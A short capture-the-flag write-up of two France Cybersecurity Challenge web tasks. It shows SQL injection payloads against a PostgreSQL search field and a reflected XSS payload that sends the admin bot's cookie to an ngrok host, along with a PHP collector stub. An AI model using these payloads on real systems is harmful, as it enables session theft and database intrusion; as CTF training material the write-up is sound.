Chapristi 1/2

The goal is to find a hidden meme, there is a search field on the home page. If I try to put test with a quote, an error message appears, pq indicates that the DB is in PostgreSQL.

With the payload test'--, I get a syntax error at the end of the input.

If I try to display all the memes on the site with the payload test' or 1=1--, I get the same return. And If I add ) at the end of the input to break the context, the flag is displayed.

Gare au gorille

On the home page, the search field is vulnerable to a reflected XSS with the <script>alert('XSS')</script> payload.

There is also the possibility to report a flag to the admin by clicking on the race flag of a meme.

Only the admin has the possibility to add a meme.

Setting up ngrok to steal the admin token. Ngrok is a cross-platform application that exposes local server ports to the Internet. It’s easy to set up, just takes two minutes and documentation. Exposing the 4444 port with python and ngrok setup.

To get the admin token, I will create a basic file.php file.

<?php
$cookie = $_GET["cookie"];
?>

With cookie editor, we can see that the value of our token is HV6nHr2m6TYGOOaFtikDwlWRC9FLjtAVer5bzkCEvNSM8kgH7w82BD4zUdflWIwR.

Get the admin’s token with the following payload in the URL https://gare-au-gorille.france-cybersecurity-challenge.fr/report?url=/?search=

<script>window.location=`https://a6d5-90-39-121-143.eu.ngrok.io/file.php?cookie=${document.cookie}`</script>

In ngrok inspect, we find the token of the admin

Change the token and refresh the page

To get the flag, just click on Ajouter un meme
